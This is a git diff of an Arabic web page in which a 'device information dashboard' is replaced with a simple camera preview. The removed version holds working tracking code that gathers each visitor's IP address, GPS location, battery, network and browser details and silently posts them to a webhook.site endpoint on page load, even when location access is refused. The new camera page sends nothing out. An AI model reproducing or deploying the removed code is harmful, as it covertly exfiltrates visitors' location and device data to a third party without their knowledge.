@@ -1,139 +1,17 @@
-<!DOCTYPE html>
-<html lang="ar">
-<head>
-  <meta charset="UTF-8">
-  <title>📋 لوحة المعلومات</title>
-  <style>
-    body { font-family: Arial, sans-serif; direction: rtl; margin: 20px; }
-    table { border-collapse: collapse; width: 100%; margin-top: 15px; }
-    td, th { border: 1px solid #ccc; padding: 8px; text-align: left; }
-    th { background: #f2f2f2; }
-    #map { width: 100%; height: 300px; margin-top: 15px; border: 1px solid #ccc; }
-    button { margin-top: 15px; padding: 10px 15px; cursor: pointer; }
-  </style>
-</head>
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>كاميرا تجريبية</title></head>
 <body>
-  <h2>📊 لوحة معلومات جهازك</h2>
-  <table>
-    <tr><th>المعلومة</th><th>القيمة</th></tr>
-    <tr><td>المتصفح / الجهاز</td><td id="ua"></td></tr>
-    <tr><td>النظام</td><td id="os"></td></tr>
-    <tr><td>المتصفح</td><td id="browser"></td></tr>
-    <tr><td>عنوان IP</td><td id="ip"></td></tr>
-    <tr><td>التاريخ والوقت</td><td id="time"></td></tr>
-    <tr><td>الموقع (GPS)</td><td id="location"></td></tr>
-    <tr><td>البطارية</td><td id="battery"></td></tr>
-    <tr><td>نوع الشبكة</td><td id="network"></td></tr>
-  </table>
-
-  <div id="map">🗺️ جاري تحميل الخريطة...</div>
-  <button onclick="copyInfo()">📋 انسخ كل المعلومات</button>
-
+  <h3>كاميرا مباشرة (المتصفح سيطلب إذن)</h3>
+  <video id="v" autoplay playsinline style="width:100%;max-width:400px"></video>
   <script>
-    const webhook = "https://webhook.site/39fd585b-d6ee-4ca0-814f-0840a0fa0037";
-    const data = {};
-
-    // User Agent
-    data.userAgent = navigator.userAgent;
-    document.getElementById("ua").innerText = data.userAgent;
-
-    // Detect OS & Browser
-    function detectBrowserOS(ua){
-      let os = "غير معروف", browser = "غير معروف";
-      if(ua.indexOf("Win")!=-1) os="Windows";
-      else if(ua.indexOf("Mac")!=-1) os="MacOS";
-      else if(ua.indexOf("Linux")!=-1) os="Linux";
-      else if(ua.indexOf("Android")!=-1) os="Android";
-      else if(ua.indexOf("iPhone")!=-1) os="iOS";
-
-      if(ua.indexOf("Chrome")!=-1) browser="Chrome";
-      else if(ua.indexOf("Firefox")!=-1) browser="Firefox";
-      else if(ua.indexOf("Safari")!=-1) browser="Safari";
-      else if(ua.indexOf("Edge")!=-1) browser="Edge";
-
-      return {os, browser};
-    }
-    let detect = detectBrowserOS(data.userAgent);
-    data.os = detect.os; data.browser = detect.browser;
-    document.getElementById("os").innerText = data.os;
-    document.getElementById("browser").innerText = data.browser;
-
-    // Time
-    data.time = new Date().toLocaleString();
-    document.getElementById("time").innerText = data.time;
-
-    // IP
-    fetch("https://api.ipify.org?format=json")
-      .then(res => res.json())
-      .then(ipdata => {
-        data.ip = ipdata.ip;
-        document.getElementById("ip").innerText = data.ip;
+    navigator.mediaDevices.getUserMedia({video:true, audio:false})
+      .then(stream => {
+        document.getElementById('v').srcObject = stream;
+      })
+      .catch(err => {
+        alert('فشل الوصول للكاميرا: ' + err.message);
       });
-
-    // Battery
-    if(navigator.getBattery){
-      navigator.getBattery().then(bat => {
-        data.battery = `${(bat.level*100).toFixed(0)}% ${bat.charging?"⚡ شحن":"🔋 غير مشحون"}`;
-        document.getElementById("battery").innerText = data.battery;
-      });
-    } else {
-      data.battery = "غير مدعوم";
-      document.getElementById("battery").innerText = data.battery;
-    }
-
-    // Network
-    if(navigator.connection){
-      data.network = `${navigator.connection.effectiveType} (${navigator.connection.downlink}Mb)`;
-      document.getElementById("network").innerText = data.network;
-    } else {
-      data.network = "غير مدعوم";
-      document.getElementById("network").innerText = data.network;
-    }
-
-    // GPS + Map
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        pos => {
-          let lat = pos.coords.latitude.toFixed(5);
-          let lon = pos.coords.longitude.toFixed(5);
-          data.location = `خط العرض: ${lat}, خط الطول: ${lon}`;
-          document.getElementById("location").innerText = data.location;
-
-          let mapFrame = `<iframe width="100%" height="300" 
-            src="https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed"></iframe>`;
-          document.getElementById("map").innerHTML = mapFrame;
-
-          // Send to Webhook
-          sendToWebhook();
-        },
-        err => {
-          data.location = "🚫 رفض السماح بالموقع";
-          document.getElementById("location").innerText = data.location;
-          document.getElementById("map").innerText = "لا يمكن عرض الخريطة.";
-          sendToWebhook();
-        }
-      );
-    } else {
-      data.location = "غير مدعوم";
-      document.getElementById("location").innerText = data.location;
-      document.getElementById("map").innerText = "لا يمكن عرض الخريطة.";
-      sendToWebhook();
-    }
-
-    // Copy button
-    function copyInfo(){
-      let text = `المتصفح/الجهاز: ${data.userAgent}\nالنظام: ${data.os}\nالمتصفح: ${data.browser}\nIP: ${data.ip}\nالوقت: ${data.time}\nالموقع: ${data.location}\nالبطارية: ${data.battery}\nالشبكة: ${data.network}`;
-      navigator.clipboard.writeText(text).then(()=>alert("✅ تم نسخ المعلومات!"));
-    }
-
-    // Send data to Webhook
-    function sendToWebhook(){
-      fetch(webhook, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
-      });
-    }
   </script>
 </body>
 </html>
